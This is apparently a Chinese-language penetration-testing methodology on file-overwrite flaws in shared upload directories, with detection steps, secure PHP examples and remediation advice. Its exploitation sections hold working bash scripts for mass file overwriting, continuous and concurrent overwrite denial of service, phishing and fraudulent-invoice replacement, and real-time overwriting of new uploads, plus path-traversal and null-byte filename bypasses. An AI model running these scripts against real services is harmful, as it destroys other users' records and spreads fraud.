# **文件覆盖攻击方法论**

**文档版本：** 1.0  
**创建日期：** 2026 年 3 月 15 日  
**适用场景：** 文件上传系统中因共享命名空间导致的文件覆盖漏洞检测与利用

---

# **第一部分：文档概述**

## 1.1 编写目的
本文档为渗透测试人员提供一套标准化、可复现的文件覆盖漏洞测试与利用流程。重点针对多用户文件上传系统中因共享存储目录、缺失文件名唯一化、无所有权验证导致的文件覆盖攻击，涵盖数据完整性破坏、拒绝服务、恶意内容替换等攻击技术。

## 1.2 适用范围
本文档描述的渗透技术适用于以下类型的应用和场景：
- 多用户共享文件上传目录
- 上传文件使用原始文件名（无唯一化）
- 无文件存在性检查或覆盖警告
- 无文件所有权验证机制
- 上传端点无速率限制
- 文件被其他用户依赖或引用

## 1.3 读者对象
- 执行渗透测试任务的安全工程师
- 安全分析师
- 负责代码审计的开发人员
- 红队渗透测试人员

---

# **第二部分：核心渗透技术专题**

## 专题一：文件覆盖攻击

### 2.1 技术介绍

**漏洞原理：**
文件覆盖漏洞是指应用程序在處理多用户文件上传时，所有用户上传的文件存储在同一共享目录中，且使用原始文件名或可预测的文件名，导致攻击者可以通过上传同名文件覆盖其他用户的文件，从而破坏数据完整性、实施拒绝服务攻击或替换为恶意内容。

**漏洞本质：**
- 共享命名空间：所有用户上传到同一目录
- 文件名冲突：无唯一化机制（UUID、时间戳、用户 ID 前缀）
- 静默覆盖：`move_uploaded_file()` 默认覆盖已存在文件
- 无审计追踪：覆盖操作无日志、无通知、无版本控制

**典型漏洞代码模式：**
```php
// 危险代码示例 - 文件上传无保护

// upload.php
$uploadFileDir = './uploaded_invoices/';  // 共享目录
$fileName = $_FILES['invoice']['name'];   // 使用原始文件名
$dest_path = $uploadFileDir . $fileName;  // 无唯一化

// 静默覆盖 - move_uploaded_file 默认覆盖已存在文件
move_uploaded_file($fileTmpPath, $dest_path);

// 关键问题：
// 1. 无 file_exists() 检查
// 2. 无文件名唯一化
// 3. 无所有权验证
// 4. 无版本控制
// 5. 无覆盖通知
```

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
|-------------|-------------|---------------|
| **发票上传** | 用户上传 PDF 发票 | 攻击者覆盖他人发票，导致财务记录丢失 |
| **文档协作** | 团队共享文档编辑 | 恶意覆盖他人编辑内容 |
| **报告提交** | 学生提交作业报告 | 覆盖他人提交，导致成绩丢失 |
| **简历上传** | 求职者上传简历 | 覆盖他人简历，导致机会丢失 |
| **证据上传** | 法律证据提交 | 覆盖关键证据，影响案件 |
| **医疗记录** | 患者上传检查报告 | 覆盖医疗记录，影响诊断 |
| **合同签署** | 电子合同上传 | 覆盖已签署合同，法律风险 |
| **备份存储** | 用户备份配置文件 | 覆盖备份，导致数据无法恢复 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试 - 文件覆盖检测

**步骤 1：确认共享目录**

```bash
# 上传测试文件
echo "ORIGINAL_CONTENT_V1" > /tmp/test_overwrite.pdf

curl -X POST http://target/upload.php \
  -F "invoice=@/tmp/test_overwrite.pdf" \
  -b "PHPSESSID=user_a_session" \
  -v 2>&1 | grep -i "success\|uploaded"

# 记录文件访问 URL
FILE_URL="http://target/uploaded_invoices/test_overwrite.pdf"

# 验证文件内容
curl -s "$FILE_URL"
# 预期输出：ORIGINAL_CONTENT_V1
```

**步骤 2：测试文件覆盖**

```bash
# 使用相同文件名上传不同内容
echo "MALICIOUS_CONTENT_V2" > /tmp/test_overwrite.pdf

curl -X POST http://target/upload.php \
  -F "invoice=@/tmp/test_overwrite.pdf" \
  -b "PHPSESSID=user_b_session" \
  -v 2>&1 | grep -i "success\|uploaded"

# 验证文件是否被覆盖
curl -s "$FILE_URL"
# 预期输出（存在漏洞）：MALICIOUS_CONTENT_V2
```

**步骤 3：检查覆盖警告**

```bash
# 观察上传响应中是否有覆盖警告
# 安全应用应返回类似：
# - "File already exists, overwrite?"
# - "A file with this name already exists"

# 如果直接返回"上传成功"，存在静默覆盖漏洞
```

#### 2.3.2 白盒测试 - 代码审计

**审计关键词搜索：**
```bash
# 搜索文件移动操作
grep -rn "move_uploaded_file" /path/to/code

# 搜索文件存在性检查
grep -rn "file_exists" /path/to/code
# 预期：无结果或结果极少（漏洞指标）

# 搜索文件名唯一化
grep -rn "uniqid\|random_bytes\|uuid\|time()" /path/to/code | grep -i file
# 预期：无结果（漏洞指标）

# 搜索覆盖警告
grep -rn "overwrite\|already exists\|replace" /path/to/code
# 预期：无结果（漏洞指标）
```

**危险代码模式识别：**
```php
// 危险模式 1：直接移动无检查
$dest_path = $uploadDir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $dest_path);

// 危险模式 2：共享目录无用户隔离
$uploadFileDir = './uploads/';  // 所有用户共享

// 危险模式 3：无文件名唯一化
$fileName = $_FILES['file']['name'];  // 应添加用户 ID 或 UUID 前缀

// 危险模式 4：无数据库记录
// 缺少：INSERT INTO files (user_id, filename, ...) VALUES (...)
```

### 2.4 漏洞利用方法

#### 2.4.1 数据完整性破坏攻击

**攻击场景：** 攻击者恶意覆盖其他用户的重要文件，导致数据丢失。

**步骤 1：识别目标文件**

```bash
# 通过目录列表或其他方式获取目标文件名
curl -s http://target/uploaded_invoices/ | grep -oP 'href="\K[^"]+' | grep -v "Parent"

# 假设发现目标文件：confidential_invoice.pdf
```

**步骤 2：覆盖目标文件**

```bash
# 创建恶意内容
echo "This file has been overwritten by attacker" > /tmp/confidential_invoice.pdf

# 上传覆盖
curl -X POST http://target/upload.php \
  -F "invoice=@/tmp/confidential_invoice.pdf;filename=confidential_invoice.pdf" \
  -b "PHPSESSID=attacker_session"

# 验证覆盖成功
curl -s http://target/uploaded_invoices/confidential_invoice.pdf
# 预期输出：This file has been overwritten by attacker
```

**步骤 3：自动化批量覆盖脚本**

```bash
#!/bin/bash
# 批量文件覆盖攻击脚本

TARGET_UPLOAD="http://target/upload.php"
TARGET_DIR="http://target/uploaded_invoices"
ATTACKER_COOKIE="PHPSESSID=attacker_session_value"

# 获取目标文件列表
curl -s "$TARGET_DIR/" | grep -oP 'href="\K[^"]+' | grep -v "Parent" > /tmp/target_files.txt

echo "[*] Found $(wc -l < /tmp/target_files.txt) files to overwrite"

# 覆盖每个文件
while IFS= read -r filename; do
    if [ -n "$filename" ]; then
        echo "[*] Overwriting: $filename"
        
        # 创建恶意内容
        echo "OVERWRITTEN_BY_ATTACKER_$(date)" > "/tmp/$filename"
        
        # 上传覆盖
        curl -s -X POST "$TARGET_UPLOAD" \
            -F "invoice=@/tmp/$filename;filename=$filename" \
            -b "$ATTACKER_COOKIE" > /dev/null
        
        echo "    [+] Overwritten"
    fi
done < /tmp/target_files.txt

echo "[+] Batch overwrite complete"
```

#### 2.4.2 拒绝服务攻击

**攻击场景：** 持续覆盖关键文件，使目标用户无法正常使用服务。

**步骤 1：识别关键文件**

```bash
# 识别频繁访问或重要的文件
# - 发票文件
# - 合同文件
# - 报告文件
# - 配置文件
```

**步骤 2：持续覆盖攻击**

```bash
#!/bin/bash
# 持续文件覆盖 DoS 攻击

TARGET_FILE="$1"  # 例如：important_contract.pdf
TARGET_UPLOAD="http://target/upload.php"
ATTACKER_COOKIE="PHPSESSID=attacker_session"

echo "[*] Starting continuous overwrite attack on: $TARGET_FILE"

# 持续覆盖 100 次
for i in {1..100}; do
    echo "GARBAGE_CONTENT_ITERATION_$i" > "/tmp/$TARGET_FILE"
    
    curl -s -X POST "$TARGET_UPLOAD" \
        -F "invoice=@/tmp/$TARGET_FILE;filename=$TARGET_FILE" \
        -b "$ATTACKER_COOKIE" > /dev/null
    
    echo "[$i/100] Overwritten"
    sleep 1  # 每秒覆盖一次
done

echo "[+] Attack complete"
```

**步骤 3：并发覆盖攻击**

```bash
#!/bin/bash
# 并发文件覆盖攻击

TARGET_FILE="$1"
TARGET_UPLOAD="http://target/upload.php"

# 启动 10 个并发进程持续覆盖
for i in {1..10}; do
    (
        while true; do
            echo "CONCURRENT_ATTACK_$RANDOM" > "/tmp/$TARGET_FILE"
            curl -s -X POST "$TARGET_UPLOAD" \
                -F "invoice=@/tmp/$TARGET_FILE;filename=$TARGET_FILE" \
                -b "PHPSESSID=attacker_${i}" > /dev/null
        done
    ) &
done

echo "[*] Started 10 concurrent overwrite processes"
wait
```

#### 2.4.3 恶意内容替换攻击

**攻击场景：** 将合法文件替换为恶意内容，误导文件查看者。

**步骤 1：创建恶意 PDF**

```bash
# 方法 1：简单文本替换
cat > /tmp/malicious_invoice.pdf << 'EOF'
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] 
   /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>
endobj
4 0 obj
<< /Length 44 >>
stream
BT /F1 24 Tf 100 700 Td (FRAUDULENT INVOICE) Tj ET
endstream
endobj
5 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj
xref
0 6
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000266 00000 n 
0000000359 00000 n 
trailer
<< /Size 6 /Root 1 0 R >>
startxref
436
%%EOF
EOF
```

**步骤 2：覆盖合法发票**

```bash
# 覆盖目标发票文件
curl -X POST http://target/upload.php \
  -F "invoice=@/tmp/malicious_invoice.pdf;filename=victim_invoice.pdf" \
  -b "PHPSESSID=attacker_session"

# 受害者下载时将获得恶意内容
```

**步骤 3：钓鱼内容替换**

```bash
# 创建钓鱼内容
cat > /tmp/phishing_document.pdf << 'EOF'
重要通知

您的账户需要重新验证。
请点击以下链接更新您的凭证：
http://attacker.com/phishing-page

此致，
系统管理员
EOF

# 覆盖重要通知文件
curl -X POST http://target/upload.php \
  -F "invoice=@/tmp/phishing_document.pdf;filename=important_notice.pdf" \
  -b "PHPSESSID=attacker_session"
```

#### 2.4.4 竞争条件攻击

**攻击场景：** 在目标用户上传文件后立即覆盖，制造混乱。

**步骤 1：监控新文件上传**

```bash
#!/bin/bash
# 监控新文件上传

TARGET_DIR="http://target/uploaded_invoices"
KNOWN_FILES="/tmp/known_files.txt"

# 初始化已知文件列表
curl -s "$TARGET_DIR/" | grep -oP 'href="\K[^"]+' | grep -v "Parent" > "$KNOWN_FILES"

echo "[*] Monitoring for new files..."

while true; do
    # 获取当前文件列表
    curl -s "$TARGET_DIR/" | grep -oP 'href="\K[^"]+' | grep -v "Parent" > /tmp/current_files.txt
    
    # 查找新文件
    new_files=$(comm -13 "$KNOWN_FILES" /tmp/current_files.txt)
    
    if [ -n "$new_files" ]; then
        echo "[+] New file detected:"
        echo "$new_files"
        
        # 立即覆盖新文件
        for file in $new_files; do
            echo "OVERWRITTEN_IMMEDIATELY" > "/tmp/$file"
            curl -s -X POST "http://target/upload.php" \
                -F "invoice=@/tmp/$file;filename=$file" \
                -b "PHPSESSID=attacker" > /dev/null
            echo "    [+] Overwritten: $file"
        done
        
        # 更新已知文件列表
        cp /tmp/current_files.txt "$KNOWN_FILES"
    fi
    
    sleep 2
done
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过文件存在性检查

```bash
# 如果应用检查文件是否存在但仅警告
# 方法 1：使用相同内容多次上传确认
curl -X POST http://target/upload.php \
  -F "invoice=@/tmp/file.pdf;filename=target.pdf" \
  -b "PHPSESSID=attacker"

# 第一次：可能返回"File exists, confirm overwrite?"
# 第二次：确认覆盖
```

#### 2.5.2 绕过文件名 sanitization

```bash
# 如果应用尝试清理文件名但逻辑有缺陷
# 方法 1：双扩展名绕过
# 应用可能只检查最后一个扩展名
curl -X POST http://target/upload.php \
  -F "invoice=@/tmp/file.pdf;filename=target.pdf.pdf"

# 方法 2：空字节注入（旧版本 PHP）
# filename=target.pdf%00.pdf
```

#### 2.5.3 绕过用户目录隔离

```bash
# 如果应用使用用户 ID 子目录但存在路径遍历
# 方法 1：路径遍历
curl -X POST http://target/upload.php \
  -F "invoice=@/tmp/file.pdf;filename=../../other_user/file.pdf"

# 方法 2：符号链接攻击
# 如果应用创建符号链接，可创建指向其他用户目录的链接
```

---

# **第三部分：附录**

## 3.1 文件覆盖风险速查表

| **风险类型** | **攻击方式** | **影响** | **利用难度** |
|-------------|-------------|---------|-------------|
| **数据完整性破坏** | 覆盖重要文件 | 数据丢失 | 低 |
| **拒绝服务** | 持续覆盖 | 服务不可用 | 低 |
| **恶意内容替换** | 替换为钓鱼内容 | 欺诈风险 | 中 |
| **竞争条件攻击** | 监控并立即覆盖 | 用户混淆 | 中 |
| **法律风险** | 覆盖合同/证据 | 法律责任 | 高 |

## 3.2 安全配置代码示例

```php
// 安全代码示例 - 防止文件覆盖

function upload_file_secure($file, $user_id) {
    $upload_dir = '/var/uploads/';
    
    // 1. 生成唯一文件名
    $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
    $safe_filename = bin2hex(random_bytes(16)) . '_' . time() . '.' . $extension;
    
    $dest_path = $upload_dir . $safe_filename;
    
    // 2. 检查文件是否存在（防御性检查）
    if (file_exists($dest_path)) {
        // 理论上不会发生，因为使用唯一文件名
        throw new Exception("File already exists");
    }
    
    // 3. 移动文件
    if (!move_uploaded_file($file['tmp_name'], $dest_path)) {
        throw new Exception("Upload failed");
    }
    
    // 4. 记录到数据库（所有权追踪）
    $stmt = $db->prepare("INSERT INTO files (user_id, filename, original_name, path, created_at) VALUES (?, ?, ?, ?, NOW())");
    $stmt->bind_param("isss", $user_id, $safe_filename, $file['name'], $dest_path);
    $stmt->execute();
    
    // 5. 设置适当权限
    chmod($dest_path, 0644);
    
    return $safe_filename;
}

// 如果必须使用原始文件名（业务需求）
function upload_file_with_original_name($file, $user_id) {
    $upload_dir = '/var/uploads/' . $user_id . '/';  // 用户特定目录
    
    // 确保用户目录存在
    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    
    $safe_filename = basename($file['name']);  // 防止路径遍历
    $dest_path = $upload_dir . $safe_filename;
    
    // 检查文件是否存在
    if (file_exists($dest_path)) {
        // 选项 1：拒绝上传
        // throw new Exception("File already exists. Please use a different name.");
        
        // 选项 2：生成新版本
        $extension = pathinfo($safe_filename, PATHINFO_EXTENSION);
        $basename = pathinfo($safe_filename, PATHINFO_FILENAME);
        $new_filename = $basename . '_v' . time() . '.' . $extension;
        $dest_path = $upload_dir . $new_filename;
        
        // 选项 3：要求用户确认
        // return ['status' => 'confirm', 'message' => 'File exists, overwrite?'];
    }
    
    move_uploaded_file($file['tmp_name'], $dest_path);
    
    // 记录到数据库
    $stmt = $db->prepare("INSERT INTO files (user_id, filename, original_name, path, created_at) VALUES (?, ?, ?, ?, NOW())");
    $stmt->bind_param("isss", $user_id, basename($dest_path), $file['name'], $dest_path);
    $stmt->execute();
    
    return basename($dest_path);
}
```

## 3.3 检测脚本

```bash
#!/bin/bash
# 文件覆盖漏洞检测脚本

TARGET_UPLOAD="$1/upload.php"
TARGET_DIR="$2/uploaded_invoices"
COOKIE="$3"

OUTPUT_DIR="/tmp/file_overwrite_audit_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "=========================================="
echo "File Overwrite Vulnerability Audit"
echo "Upload Endpoint: $TARGET_UPLOAD"
echo "File Directory: $TARGET_DIR"
echo "Output: $OUTPUT_DIR"
echo "=========================================="

# 测试 1：基本文件覆盖测试
echo ""
echo "[*] Test 1: Basic file overwrite test..."

TEST_FILENAME="test_overwrite_$(date +%s).pdf"

# 第一次上传
echo "ORIGINAL_CONTENT_V1" > "/tmp/$TEST_FILENAME"
echo "[*] Uploading original file..."
curl -s -X POST "$TARGET_UPLOAD" \
    -F "invoice=@/tmp/$TEST_FILENAME;filename=$TEST_FILENAME" \
    -b "$COOKIE" > "$OUTPUT_DIR/upload1_response.txt"

# 验证第一次上传
ORIGINAL_CONTENT=$(curl -s "$TARGET_DIR/$TEST_FILENAME")
echo "Original content: $ORIGINAL_CONTENT"

# 第二次上传（覆盖）
echo "OVERWRITTEN_CONTENT_V2" > "/tmp/$TEST_FILENAME"
echo "[*] Uploading overwrite file..."
curl -s -X POST "$TARGET_UPLOAD" \
    -F "invoice=@/tmp/$TEST_FILENAME;filename=$TEST_FILENAME" \
    -b "$COOKIE" > "$OUTPUT_DIR/upload2_response.txt"

# 验证覆盖
NEW_CONTENT=$(curl -s "$TARGET_DIR/$TEST_FILENAME")
echo "New content: $NEW_CONTENT"

if [ "$NEW_CONTENT" == "OVERWRITTEN_CONTENT_V2" ]; then
    echo "[-] VULNERABILITY: File was silently overwritten"
    echo "    Original: $ORIGINAL_CONTENT"
    echo "    Overwritten: $NEW_CONTENT"
else
    echo "[+] File was NOT overwritten (may be secure)"
fi

# 测试 2：检查覆盖警告
echo ""
echo "[*] Test 2: Checking for overwrite warning..."

if grep -qi "overwrite\|already exists\|replace\|exists" "$OUTPUT_DIR/upload2_response.txt"; then
    echo "[+] Overwrite warning detected (partial protection)"
else
    echo "[-] No overwrite warning (silent overwrite)"
fi

# 测试 3：多用户覆盖测试（需要多个会话）
echo ""
echo "[*] Test 3: Multi-user overwrite test..."

# 这需要两个有效会话
# USER_A_COOKIE 和 USER_B_COOKIE

if [ -n "$USER_B_COOKIE" ]; then
    # User A 上传
    echo "USER_A_CONTENT" > "/tmp/$TEST_FILENAME"
    curl -s -X POST "$TARGET_UPLOAD" \
        -F "invoice=@/tmp/$TEST_FILENAME;filename=$TEST_FILENAME" \
        -b "$USER_A_COOKIE" > /dev/null
    
    # User B 覆盖
    echo "USER_B_CONTENT" > "/tmp/$TEST_FILENAME"
    curl -s -X POST "$TARGET_UPLOAD" \
        -F "invoice=@/tmp/$TEST_FILENAME;filename=$TEST_FILENAME" \
        -b "$USER_B_COOKIE" > /dev/null
    
    # 验证内容
    FINAL_CONTENT=$(curl -s "$TARGET_DIR/$TEST_FILENAME")
    
    if [ "$FINAL_CONTENT" == "USER_B_CONTENT" ]; then
        echo "[-] VULNERABILITY: Cross-user overwrite possible"
    fi
fi

echo ""
echo "=========================================="
echo "Audit Complete"
echo "Results saved to: $OUTPUT_DIR"
echo "=========================================="
```

## 3.4 修复建议

**文件上传安全配置清单：**

1. **唯一文件名**
   - 使用 UUID 或随机字符串：`bin2hex(random_bytes(16))`
   - 添加时间戳：`time()`
   - 添加用户 ID 前缀：`{user_id}_{filename}`

2. **用户隔离**
   - 使用用户特定子目录：`/uploads/{user_id}/`
   - 或数据库隔离不同用户文件

3. **覆盖保护**
   - 检查文件存在性：`file_exists()`
   - 要求用户确认覆盖
   - 或自动生成新版本文件名

4. **审计追踪**
   - 记录所有上传操作到数据库
   - 记录文件所有权
   - 实现版本控制

5. **速率限制**
   - 限制每用户上传频率
   - 防止批量覆盖攻击

---

**文档结束**
